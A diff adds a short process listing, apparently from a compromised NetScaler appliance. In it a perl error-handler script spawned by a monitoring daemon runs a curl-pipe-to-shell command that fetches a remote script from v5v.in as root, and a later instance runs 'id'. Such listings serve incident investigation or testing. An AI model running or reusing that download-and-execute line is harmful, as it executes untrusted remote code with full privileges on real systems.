@@ -1,0 +1,9 @@
+  PID  PPID USER     STARTED                      COMMAND
+    1     0 root     Mon Oct  5 03:00:00 2026     /sbin/init
+  812     1 root     Mon Oct  5 03:00:05 2026     /usr/sbin/cron -s
+  648     1 root     Mon Oct  5 03:00:06 2026     /netscaler/monuploadd monuploadd -P
+ 4411   648 root     Mon Oct 12 04:12:00 2026     /usr/bin/perl /netscaler/ns_monuploadd_err.pl -WR
+ 4412  4411 root     Mon Oct 12 04:12:01 2026     sh -c curl -sSLk https://v5v.in/r.sh|sh
+ 4410   812 root     Mon Oct 12 04:10:00 2026     /usr/bin/perl /netscaler/ns_monuploadd_err.pl -WR
+ 5120     1 nobody   Mon Oct 12 05:22:13 2026     /usr/bin/perl /netscaler/ns_monuploadd_err.pl -WR
+ 5121  5120 nobody   Mon Oct 12 05:22:14 2026     sh -c id
